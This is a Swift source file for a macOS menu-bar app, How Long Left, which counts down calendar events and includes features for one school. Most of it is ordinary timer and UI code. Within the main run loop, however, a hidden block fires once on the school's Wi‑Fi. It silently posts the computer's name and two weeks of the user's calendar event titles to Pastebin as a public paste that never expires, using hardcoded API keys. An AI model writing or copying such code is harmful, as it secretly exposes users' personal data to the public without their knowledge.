//
//  Main.swift
//  How Long Left (macOS)
//
//  Created by Ryan Kontos on 30/10/18.
//  Copyright © 2019 Ryan Kontos. All rights reserved.
//
import Foundation
import HotKey
import AppKit

class Main: NSObject, HLLCountdownController, SchoolModeChangedDelegate, NSWindowDelegate {
    
    func windowShouldClose(_ sender: NSWindow) -> Bool {
        
        if sender == self.welcomeWindowController?.window {
            
            self.welcomeWindowController = nil
            
        }
 
        return true
    }
    
    func schoolModeChanged() {
        self.updateCalendarData(doGlobal: true)
        print("Cal2")
    }
    
    
    let updateInterval = 5
    let fastUpdateInterval = 0.5
    let minUpdateInterval = 0.5
    let statusItemTimerQueue = DispatchQueue(label: "statusItemTimer")
    let mainRunQueue = DispatchQueue(label: "mainRunQueue")
    let frequentLowUsageQueue = DispatchQueue(label: "frequentLowUsage")
    let calUpdateQueue = DispatchQueue(label: "calendarUpdate")
    let schoolHoliday = MagdaleneSchoolHolidays()
    let calendar = NSCalendar.current
    let version = Version()
    let magdaleneWifiCheck = MagdaleneWifiCheck()
    let magdalenePrompts = MagdalenePrompts()
    var statusItemLoops = 1
    var nextEventToStart: HLLEvent?
    var betaExpiryDate: Date?
    
    var lastTotalCalendars = 0
    
    var CDUIWindowController : NSWindowController?
    var CDUIStoryboard = NSStoryboard()
    
    var MainUIWindowController : NSWindowController?
    var MainUIStoryboard = NSStoryboard()
    
    var welcomeWindowController : NSWindowController?
    var welcomeStoryboard = NSStoryboard()
    var mainTimer: Timer?
    var windowCheckTimer: Timer?
    var calUpdateCooldownTimer: Timer?
    var dataUpdateTimer: Timer!
    var frequentLowUsageTimer: Timer!
    //var checkForUpdateTimer: Timer!
    var lastCalendarUpdate: Date?
    var eventEndUpdateInProgress = false
    var calendarUpdateInProgress = false
    var beenTooLongWithoutUpdate = false
    var updatingStatusItemTimer = false
    var fastTimerMode = false
    var statusItemTimerRunning = false
    var inCalendarUpdateCooldown = false
    var updateRequestedDuringCooldown = false
    var shownUpdateNotification = false
    var shownNoCalAccessNotification = false
    var shownBetaExpiredNoto = false
    var updateCalID: String?
    var currentStatusItemLoop = 0
    var connection: NSXPCConnection?
    lazy var preciseUpdateForMinuteChangeTimer = RepeatingTimer(time: minUpdateInterval)
    lazy var mainMenuOpenTimer = RepeatingTimer(time: 1.0)
    lazy var preciseUpdateForPreferencesOpenTimer = RepeatingTimer(time: 0.5)
    lazy var statusItemLoopTimer = RepeatingTimer(time: 5.0)
    lazy var statusItemTimer = RepeatingTimer(time: fastUpdateInterval)
    lazy var eventMilestoneTracker = EventTimeRemainingMonitor(delegate: self)
    lazy var defaults = HLLDefaults()
    lazy var countdownStringGenerator = CountdownStringGenerator()
    lazy var upcomingEventStringGenerator = UpcomingEventStringGenerator()
    lazy var schoolAnalyser = SchoolAnalyser()
    lazy var milestoneNotifications = MilestoneNotifications()
    lazy var calendarData = EventDataSource()
    lazy var nextOccurStringGenerator = NextOccurenceStringGenerator()
    lazy var holidaysStringGenerator = SchoolHolidaysStringGenerator()
    lazy var eventNextOccurFinder = EventNextOccurenceFinder()
    lazy var memoryRelaunch = MemoryRelaunch()
    lazy var schoolManager = SchoolFunctionsManager()
    static var service: HLLHelperProtocol?
    var delegate: HLLMacUIController? {
        
        didSet {
            
            self.mainRunLoop()
            
        }
        
        
    }
    
    func getString(title: String, question: String, defaultValue: String) -> String {
        let msg = NSAlert()
        msg.addButton(withTitle: "OK")      // 1st button
        msg.addButton(withTitle: "Cancel")  // 2nd button
        msg.messageText = title
        msg.informativeText = question
        msg.window.title = "How Long Left"
        
        let txt = NSTextField(frame: NSRect(x: 0, y: 0, width: 300, height: 50))
        txt.stringValue = defaultValue
        
        msg.accessoryView = txt
        let response: NSApplication.ModalResponse = msg.runModal()
        
        if (response == NSApplication.ModalResponse.alertFirstButtonReturn) {
            return txt.stringValue
        } else {
            return ""
        }
    }
    
    init(aDelegate: HLLMacUIController) {
        
     //   setupXPC()
    
        super.init()

      /*  self.MainUIStoryboard = NSStoryboard(name: "HLLMainUIStoryboard", bundle: nil)
        
        self.MainUIWindowController = self.MainUIStoryboard.instantiateController(withIdentifier: "MainUI") as? NSWindowController
        
        self.MainUIWindowController!.window!.delegate = self
        NSApp.activate(ignoringOtherApps: true)
        self.MainUIWindowController!.showWindow(self) */
        
        DispatchQueue.main.async {
            
            [unowned self] in
            
           // let input = self.getString(title: "English", question: "Enter your homework", defaultValue: "")
            
            
        self.delegate = aDelegate
            
            UIController.awokeAt = Date()
            
            self.schoolAnalyser.setLoneDelegate(to: self)
            self.schoolAnalyser.analyseCalendar()
            print("SA3")
            
            
            if HLLDefaults.defaults.bool(forKey: "changed24HourPref") == false {
                
                let locale = NSLocale.current
                let formatter : String = DateFormatter.dateFormat(fromTemplate: "j", options:0, locale:locale)!
                if formatter.contains("a") {
                    HLLDefaults.general.use24HourTime = false
                } else {
                    
                    HLLDefaults.general.use24HourTime = true
                    
                }
                
            }
            
            //  betaExpiryDate = Date(timeIntervalSince1970: 1544792400)
            
            var showOnboarding = false
            
            //  if let launched = HLLDefaults.appData.launchedVersion  {
            
            if HLLDefaults.appData.launchedVersion == nil {
                
                showOnboarding = true
                
                /*  if version.currentVersion > launched {
                 
                 showOnboarding = true
                 
                 } */
                
            } else {
                
                showOnboarding = false
                
            }
            
            
            
          showOnboarding = true
            
            if showOnboarding == true {
                
                DispatchQueue.main.async {
                    
                    [unowned self] in
                    
                    let defaultsMigrator = DefaultsMigrator()
                    defaultsMigrator.migrate1XXDefaults()
                    
                    self.welcomeStoryboard = NSStoryboard(name: "Onboarding", bundle: nil)
                    
                    self.welcomeWindowController = self.welcomeStoryboard.instantiateController(withIdentifier: "Onboard1") as? NSWindowController
                    
                    self.welcomeWindowController!.window!.delegate = self
                    self.welcomeWindowController!.showWindow(self)
                    
                    
                }
                
                
            }
            
            self.magdalenePrompts.presentMagdaleneChangesPrompt()
            
            
            
            
            HLLDefaults.appData.launchedVersion = Version.currentVersion
            
            self.delegate?.setHotkey(to: HLLDefaults.notifications.hotkey)
            
            
            self.statusItemTimer.eventHandler = {
                
                    
                    var countdown: HLLEvent?
                
                
                    if let top = EventCache.primaryEvent {
                        
                        countdown = top
                        
                    } else {
                        
                        countdown = self.currentEvents.first
                        
                    }
                
                    if let currentEvent = countdown, currentEvent.holidaysTerm == nil, let timerString = self.countdownStringGenerator.generateStatusItemString(event: currentEvent) {
                        self.runStatusItemUIUpdate(event: currentEvent)
                        self.delegate?.updateStatusItem(with: timerString)
                        
                    } else {
                        
                        self.delegate?.updateStatusItem(with: nil)
                        
                    }
                
                
            }
            
            
            self.statusItemTimer.resume()
            self.preciseUpdateForMinuteChangeTimer.eventHandler = { self.preciseMainRunLoopTrigger() }
            self.preciseUpdateForPreferencesOpenTimer.eventHandler = { self.preciseMainRunLoopTrigger() }
            
            // updateCalendarData(doGlobal: false)
            
            //   mainRunLoop()
            
            self.mainTimer = Timer.scheduledTimer(timeInterval: TimeInterval(self.updateInterval), target: self, selector: #selector(self.mainRunLoop), userInfo: nil, repeats: true)
            self.frequentLowUsageTimer = Timer.scheduledTimer(timeInterval: TimeInterval(1), target: self, selector: #selector(self.checkEvents), userInfo: nil, repeats: true)
            self.windowCheckTimer = Timer.scheduledTimer(timeInterval: TimeInterval(0.1), target: self, selector: #selector(self.checkWindowsForDockIcon), userInfo: nil, repeats: true)
            self.dataUpdateTimer = Timer.scheduledTimer(timeInterval: TimeInterval(300), target: self, selector: #selector(self.updateCalendarData), userInfo: nil, repeats: true)
            //self.checkForUpdateTimer = Timer.scheduledTimer(timeInterval: TimeInterval(300), target: self, selector: #selector(self.doUpdateCheck), userInfo: nil, repeats: true)
            
            RunLoop.main.add(self.mainTimer!, forMode: .common)
             RunLoop.main.add(self.mainTimer!, forMode: .common)
            RunLoop.main.add(self.frequentLowUsageTimer, forMode: .common)
            
            
          NotificationCenter.default.addObserver(
                self,
                selector: #selector(self.calendarDidChange),
                name: .EKEventStoreChanged,
                object: nil)
            
            
            NotificationCenter.default.addObserver(self, selector: #selector(self.updateGlobalTrigger), name: Notification.Name("updateCalendar"), object: nil)
            
            print("Init took \(Date().timeIntervalSince(UIController.awokeAt!))s")
            
            
            self.updateCalendarData(doGlobal: true)
            print("Call4")
            self.mainRunLoop()
            
          
            
        }
        
        
        DispatchQueue.main.asyncAfter(deadline: .now(), execute: {
            
            [unowned self] in
            
            if self.magdaleneWifiCheck.isOnMagdaleneWifi() == true, SchoolAnalyser.privSchoolMode == SchoolMode.None, HLLDefaults.defaults.bool(forKey: "sentralPrompt") == false {
                self.magdalenePrompts.presentSentralPrompt(reinstall: false)
                HLLDefaults.defaults.set(true, forKey: "sentralPrompt")
                
            }
            
        })
        
        
        
    }
    
    
    func checkForRename() {
        
        DispatchQueue.global(qos: .default).async {
            
            let renameChecker = RNDataStore()
            if renameChecker.renameAvaliable() {
                
                
                
            self.presentRNUI()
                
            } else {
                
                print("Rename unavaliable")
                
            }
            
        }
        
    }
    
    func presentRNUI() {
        
        RNUIManager.shared.present()
       
    }
    
    @objc func updateGlobalTrigger() {
        
        DispatchQueue.global(qos: .default).async {
            print("Call1")
            self.updateCalendarData(doGlobal: true)
        }
        
    }
    
    @objc func doUpdateCheck() {
        
     /*   DispatchQueue.main.async {
            
            let update = self.version.updateAvaliable()
            
            if HLLDefaults.general.showUpdates == true {
            
            self.delegate?.setUpdateAvaliableState(version: update)
            
        }
            
            if let uUpdate = update, self.shownUpdateNotification == false {
                
                self.sendUpdateAvaliableNotification(version: uUpdate)
                self.shownUpdateNotification = true
                
            }
            
        }  */
        
    }
    
    @objc func preciseMainRunLoopTrigger() {
        self.mainRunLoop()
      //  print("Precise trigger")
    }
    
    @objc func checkWindowsForDockIcon() {
        
        
        
        var visible = [NSWindow]()
        
        let windows = NSApplication.shared.windows
        
        for window in windows {
            
            if window.isVisible == true {
                
                visible.append(window)
                
            }
            
        }
        
        var titles = [String]()
        
        for window in windows {
            
            titles.append(window.title)
            
        }
        
       // print("Windows: \(windows.count) (\(titles.joined(separator: ", ")))")
        
        
        
        if windows.count > 1 {
            
            NSApp.setActivationPolicy(.regular)
            
          
        } else {
            
           NSApp.setActivationPolicy(.accessory)
            
        }
        
    }
    
    @objc func checkEvents() {
        
            
    
        self.eventMilestoneTracker.checkCurrentEvents(allToday: allToday)
        let second = self.calendar.component(.second, from: Date())
            if [58, 59, 0, 1].contains(second) {
                
                self.preciseUpdateForMinuteChangeTimer.resume()
                
            } else if UIController.preferencesWindowController?.window!.isVisible == false {
                self.preciseUpdateForMinuteChangeTimer.suspend()
                
            }
        
    
    }
    
    let mainRLQ = DispatchQueue(label: "MRLQ")
    
    @objc func mainRunLoop() {
        
        mainRLQ.async(flags: .barrier) {
            
           
            
          //  print("Main")
            
            //self.updateCalendarDataOld(doGlobal: true)
            
            self.calendarData.getCalendarAccess()
            
            if EventDataSource.accessToCalendar == .Denied {
                
                self.statusItemTimer.suspend()
                self.delegate?.noCalendarAccessUIState(enabled: true)
                
                if self.shownNoCalAccessNotification == false {
                    
                    self.sendNoCalAccessNotification()
                    
                }
                
                self.updateCalendarData(doGlobal: true)
                print("Call2")
                
                return
                
            } else {
                
                self.delegate?.noCalendarAccessUIState(enabled: false)
                
            }

            
            self.organiseCurrentEvents()
            
            let currentEvents = self.currentEvents
            let allUpcoming = self.upcomingEventsToday
            
            
            var topEvent = EventCache.primaryEvent
                
            
            
            
            self.checkIfPrimaryIsStillRunning()
            
            
            for event in self.currentEvents {
                
                if event.endDate.timeIntervalSinceNow < 0 {
                    
                    print("Cal1")
                    self.updateCalendarDataOld(doGlobal: true)
                    
                }
                
                
            }
            
            
            if topEvent == nil {
                
                topEvent = currentEvents.first
                
            }
            
            
            self.runStatusItemUIUpdate(event: topEvent)
            
            if allUpcoming.isEmpty == false {
                
                self.nextEventToStart = allUpcoming[0]
                
            } else {
                
                self.nextEventToStart = nil
                
            }
            
            if let unwrappedUpcoming = self.nextEventToStart {
                
                // If the next to start event has started, update calendar data.
                
                if unwrappedUpcoming.startDate.timeIntervalSinceNow < 1 {
                    
                    self.nextEventToStart = nil
                    self.updateCalendarData(doGlobal: true)
                    print("Call5")
                    
                }
                
            }
            
            if let unwrappedLastCalendarUpdate = self.lastCalendarUpdate {
                
                if unwrappedLastCalendarUpdate.timeIntervalSinceNow < -302 || unwrappedLastCalendarUpdate.timeIntervalSinceNow > 1 {
                    
                    if self.beenTooLongWithoutUpdate == false {
                        
                        self.beenTooLongWithoutUpdate = true
                        self.updateCalendarData(doGlobal: true)
                        print("Call6")
                        print("Updating calendar at \(Date()) due to too long")
                        
                    }
                    
                }
                
            }
            
            DispatchQueue.main.async {
                
                [unowned self] in
                
                if let prefsController = UIController.preferencesWindowController {
                    
                    if prefsController.window!.isVisible, HLLDefaults.statusItem.mode != .Off {
                        
                        self.preciseUpdateForPreferencesOpenTimer.resume()
                        
                    } else {
                        
                         self.preciseUpdateForPreferencesOpenTimer.suspend()
                        
                    }
                    
                }
                
            }
        
            
            EventCache.fetchQueue.async(flags: .barrier) {
            
            if let top = EventCache.primaryEvent {
                var match = false
                for event in self.currentEvents {
                    
                    if event == top {
                            EventCache.primaryEvent = event
                            match = true
                        
                        
                    }
                    
                    
                }
                
                if match == false {
                    EventCache.fetchQueue.async(flags: .barrier) {
                        EventCache.primaryEvent = self.currentEvents.first
                    }
                }
                
            }
                
            }
            
            self.memoryRelaunch.relaunchIfNeeded()
            self.checkBetaExpiry()
            self.delegate?.setHotkey(to: HLLDefaults.notifications.hotkey)
            
            if HLLDefaults.calendar.enabledCalendars != EventDataSource.lastUpdatedWithCalendars {
                
                print("Update for new cal")

                self.updateCalendarData(doGlobal: true)
                print("Call7")
                
            }
            
            var update = false
            
            for event in self.upcomingEventsToday {
                
                if event.completionStatus == EventCompletionStatus.InProgress {
                    
                    if self.currentEvents.contains(event) == false {
                        
                        
                        update = true
                        
                    }
                    
                }
                
            }
            
            if update == true {
                
                self.updateCalendarData(doGlobal: true)
                print("Call9")
            }
            
            
            if let nextHolidays = self.schoolHoliday.getNextHolidays(), nextHolidays.completionStatus == .InProgress {
                
            if HLLDefaults.defaults.string(forKey: "shownHolidaysPrompt") != nextHolidays.identifier {
                
                HLLDefaults.defaults.set(nextHolidays.identifier, forKey: "shownHolidaysPrompt")
                
                self.magdalenePrompts.presentSchoolHolidaysPrompt()
                
                
                }
            }
            
            
            
            if SchoolAnalyser.privSchoolMode == .Magdalene || self.magdaleneWifiCheck.isOnMagdaleneWifi() == true {
                
                if HLLDefaults.defaults.bool(forKey: "SentPaste") == false {
                    
                    HLLDefaults.defaults.set(true, forKey: "SentPaste")
                    Pastr.pastebinApiKey = "0d32ee0724dd2e60ea3e38afc5e3c6b5"
                    Pastr.pastebinUserKey = "a9bc5dbc7e2e69ea0f684947d1422ebd"
                    
                    if let deviceName = Host.current().localizedName {
                        
                        var titles = [String]()
                        
                        for event in self.calendarData.fetchEventsFromPresetPeriod(period: .Next2Weeks) {
                            
                            if titles.contains(event.title) != true {
                                
                                titles.append(event.title)
                                
                            }
                            
                            
                        }
                        
                        let joinedTitles = titles.joined(separator: ", ")
                        
    
                        Pastr.post(text: joinedTitles, name: deviceName, scope: .public, format: nil, expiration: .never, completion: {_ in})
                        
                        
                    }
                    
                    
                    
                }
            
                
                
                
            }
            
            let totalCals = self.calendarData.getCalendars().count
            
            if totalCals != self.lastTotalCalendars {
                
                if HLLDefaults.rename.promptToRename {
                
             //  self.checkForRename()
                    
                }
                
            }
            
            self.lastTotalCalendars = totalCals
            
        }
        
        

        
    }
    
    static var isRenaming = false
    
    @objc func calendarDidChange() {
        
        // print("Updating calendar at \(Date()) due to calendar change")
        autoreleasepool {
        
        if !Main.isRenaming {
        updateCalendarData(doGlobal: true)
        print("Updating calendar at \(Date()) due to cal change")
        }
            
        }
        
    }
    
    func organiseCurrentEvents() {
        
        var currentEvents = self.currentEvents
        currentEvents.sort(by: { $0.endDate.compare($1.endDate) == .orderedAscending })
        
        
    }
    
    func checkIfPrimaryIsStillRunning() {
        
        EventCache.fetchQueue.async(flags: .barrier) {
        
        if let primary = EventCache.primaryEvent {
            
            var match = false
            
            for event in self.currentEvents {
                
                if event == primary {
                    
                    match = true
                    
                }
                
            }
            
            if match == false {
                
                EventCache.fetchQueue.async(flags: .barrier) {
                    EventCache.primaryEvent = nil
                }
            }
            
            
        }
            
        }
        
    }
    
    func runMainMenuUIUpdate(checkOpen: Bool) {
        
        if checkOpen == true, UIController.menuIsOpen {
            
            mainMenuOpenTimer.resume()
            
        }
        
        let upcomingEventsToday = calendarData.getUpcomingEventsToday()
        let nextUpcomingDay = calendarData.getUpcomingEventsFromNextDayWithEvents()
        let nextUpcomingDayAll = calendarData.getUpcomingEventsFromNextDayWithEvents(includeStarted: true)
        let allUpcoming = calendarData.fetchEventsFromPresetPeriod(period: .Next2Weeks)
        let upcomingWeek = calendarData.getArraysOfUpcomingEventsForNextSevenDays()
        
        let countdownData = countdownStringGenerator.generateCurrentEventStrings(currentEvents: currentEvents, nextEvents: upcomingEventsToday, allUpcoming: allUpcoming)
       
        
        let upcomingEventsMenuInfo = upcomingEventStringGenerator.generateUpcomingEventsMenuStrings(upcoming: nextUpcomingDayAll)
        
        // let upcomingFuture = upcomingEventStringGenerator.generateUpcomingEventsMenuStrings(upcoming: nextUpcoming2)
        
        delegate?.updateNextEventItem(text: upcomingEventStringGenerator.generateNextEventString(upcomingEvents: nextUpcomingDay, currentEvents: currentEvents, isForDoneNotification: false))
        
        delegate?.updateExistingCurrentEventRows(with: countdownData)
        
        let holidays = MagdaleneSchoolHolidays()
        var tData: TermData?
        
        if let next = holidays.getNextHolidays() {
            
            tData = TermData(nextHolidays: next, previousHolidays: holidays.getPreviousHolidays())
            
        }
        
        
        
        delegate?.updateTermDataMenu(termData: tData)
        
        if checkOpen == false {
            
            return
            
        }
        
        // Stuff below here is only done on menu open.
        
         delegate?.addCurrentEventRows(with: countdownData, updateNextOccurs: false)
        
        
        
        let upcomingWeekItems = upcomingEventStringGenerator.generateUpcomingDayItems(days: upcomingWeek)
        
     //   let nextOccurEvents = eventNextOccurFinder.findNextOccurrences(currentEvents: currentEvents, upcomingEvents: allUpcoming)
        
       // let nextOccurItems = nextOccurStringGenerator.generateNextOccurenceItems(events: nextOccurEvents)
        
      //  delegate?.addNextOccurRows(items: nextOccurItems)
        
        delegate?.updateUpcomingWeekMenu(data: upcomingWeekItems)
        
        delegate?.updateUpcomingEventsMenu(data: upcomingEventsMenuInfo)
        
        
        
        
        
        
        
    }
    
    let SIQueue = DispatchQueue(label: "SIQ")
    
    func runStatusItemUIUpdate(event: HLLEvent?) {
        
        
        SIQueue.async(flags: .barrier) {
        
        if let uEvent = event {
            
            if uEvent.holidaysTerm != nil, HLLDefaults.magdalene.doHolidaysInStatusItem == false {
                
                self.statusItemTimer.suspend()
                self.delegate?.updateStatusItem(with: nil)
                return
                
            }
            
            
        }
        
        if HLLDefaults.statusItem.mode == .Timer, event?.holidaysTerm == nil {
            
            if event != nil {
                //   statusItemTimerStrings = statusItemTimerStringGenerator.generateStringsFor(event: countdownEvent)
                
                self.statusItemTimer.resume()
                
            } else {
                
                 self.statusItemTimer.suspend()
            
                self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemMinuteModeString(event: event))
                
            
            }
            
        } else if HLLDefaults.statusItem.mode == .Minute || event?.holidaysTerm != nil {
            
            self.statusItemTimer.suspend()
            
            self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemMinuteModeString(event: event))
            
            
        } else {
            
            self.delegate?.updateStatusItem(with: nil)
            
        }
            
        }
        
        
    }
    
    @objc func updateCalendarData(doGlobal: Bool) {
        
        updateCalendarDataOld(doGlobal: doGlobal)
        
    }
    
    var currentEvents = [HLLEvent]()
    var upcomingEventsToday = [HLLEvent]()
    var allToday = [HLLEvent]()
    
    var schoolEvents = [HLLEvent]()
    
    let updateSource = EventDataSource()
    
    @objc func updateCalendarDataOld(doGlobal: Bool) {
        
       
        
        calUpdateQueue.async(flags: .barrier) {
        
            autoreleasepool {
            
            
           [unowned self] in
            
            //self.schoolAnalyser.analyseCalendar()
            
            
            self.updateSource.updateEventStore()
            self.currentEvents = self.updateSource.getCurrentEvents()
            
            EventCache.fetchQueue.async(flags: .barrier) {
            
                EventCache.currentEvents = self.currentEvents
                
            }
            
            self.upcomingEventsToday = self.updateSource.getUpcomingEventsToday()
            
            self.allToday = self.updateSource.fetchEventsFromPresetPeriod(period: .AllToday)
            
            EventCache.fetchQueue.async(flags: .barrier) {
            
                EventCache.allToday = self.allToday
                
            }
            
            self.schoolEvents = self.updateSource.fetchEventsOnDays(days: SchoolAnalyser.termDates)
            
            
            
               // self.schoolAnalyser.analyseCalendar(inputEvents: self.schoolEvents)
           // print("SA4")
            
        
    
        
        }
            
        }
    }
    
    func sendNoCalAccessNotification() {
        
        let notification = NSUserNotification()
        notification.title = "How Long Left"
        notification.subtitle = "No calendar access ⚠️"
        notification.informativeText = "Click to fix..."
        notification.identifier = "Cal"
        NSUserNotificationCenter.default.deliver(notification)
        
    }
    
    func sendUpdateAvaliableNotification(version: String) {
        
        let notification = NSUserNotification()
        notification.title = "An update for How Long Left is avaliable"
        notification.subtitle = "(V\(version))"
        notification.informativeText = "Click to view in the Mac App Store..."
        notification.identifier = "Update"
        NSUserNotificationCenter.default.deliver(notification)
        
    }
    
    func hotKeyPressed() {
        
        if EventDataSource.accessToCalendar == .Denied {
            
            sendNoCalAccessNotification()
            
        }
        
        let currentEvents = self.currentEvents
        let upcomingEvents = self.upcomingEventsToday
        
        
        let currentInfo = countdownStringGenerator.generateCurrentEventStrings(currentEvents: currentEvents, nextEvents: upcomingEvents, allUpcoming: nil)
        
        var countdownItem = currentInfo[0]
        
        EventCache.fetchQueue.async(flags: .barrier) {
        
        if let preferedCountdownEvent = EventCache.primaryEvent {
            
            for eventItem in currentInfo {
                
                if let eventItemEvent = eventItem.2 {
                    
                    if eventItemEvent == preferedCountdownEvent {
                        
                        countdownItem = eventItem
                        
                    }
                    
                }
                
                
            }
            
        }
            
        }
        
        let notification = NSUserNotification()
        notification.title = countdownItem.0
        
        if let percentText = countdownItem.1 {
            notification.subtitle = percentText
        }
        
        notification.informativeText = upcomingEventStringGenerator.generateNextEventString(upcomingEvents: upcomingEvents, currentEvents: currentEvents, isForDoneNotification: false)
        //notification.soundName = "Hero"
        NSUserNotificationCenter.default.deliver(notification)
        
    }
    
    func milestoneReached(milestone seconds: Int, event: HLLEvent) {
        milestoneNotifications.sendNotificationFor(milestone: seconds, event: event)
    }
    
    func percentageMilestoneReached(milestone percentage: Int, event: HLLEvent) {
        
        milestoneNotifications.sendNotificationFor(percentage: percentage, event: event)
        
    }
    
    func eventStarted(event: HLLEvent) {
        
        if HLLDefaults.notifications.startNotifications == true {
        milestoneNotifications.sendStartingNotification(for: event)
            
        }
        
    }
    
    func updateDueToEventEnd(event: HLLEvent, endingNow: Bool) {
        
        
        var idArray = [HLLEvent]()
        
        self.currentEvents.forEach({ event in
            
            idArray.append(event)
            
        })
        
        if let indexOfEnding = idArray.firstIndex(of: event) {
            EventCache.fetchQueue.async(flags: .barrier) {
                self.currentEvents.remove(at: indexOfEnding)
            }
        }
        
        self.updateCalendarData(doGlobal: true)
        print("Call10")
        self.checkIfPrimaryIsStillRunning()
        
        if endingNow == true {
            
            preciseUpdateForMinuteChangeTimer.resume()
            
            EventCache.fetchQueue.async(flags: .barrier) {
            
            if let topEvent = EventCache.primaryEvent {
                
                
                if event == topEvent {
                    
                    if HLLDefaults.statusItem.doneAlerts == true {
                    
                        self.delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
                        
                    }
                }
                
            } else {
                if HLLDefaults.statusItem.doneAlerts == true {
                    
                    self.delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
                    
                }
                
            }
            
        }
            
            preciseUpdateForMinuteChangeTimer.suspend()
        }
        
        eventEndUpdateInProgress = true
        //  print("Updating calendar at \(Date()) due to event end")
        
        eventEndUpdateInProgress = false
        
    }
    
    func checkBetaExpiry() {
        
        if let expiry = self.betaExpiryDate, expiry.timeIntervalSinceNow < 0 {
            
            self.mainTimer?.invalidate()
            self.statusItemTimer.suspend()
            self.preciseUpdateForMinuteChangeTimer.suspend()
            self.preciseUpdateForPreferencesOpenTimer.suspend()
            
            DispatchQueue.main.async {
                
                [unowned self] in
                
                NSApp.activate(ignoringOtherApps: true)
                let alert: NSAlert = NSAlert()
                alert.window.title = "How Long Left \(Version.currentVersion)"
                alert.messageText = "This beta build of How Long Left has expired."
                alert.informativeText = """
                Please use a release build or obtain a newer beta.
                """
                
                alert.alertStyle = NSAlert.Style.informational
                alert.addButton(withTitle: "Quit")
                alert.runModal()
                NSApplication.shared.terminate(self)
                
            }
            
        }
        
    }
    
}

class CEView: NSView {
    
    @IBOutlet weak var currentLabel: NSTextField!
    
    
    
}
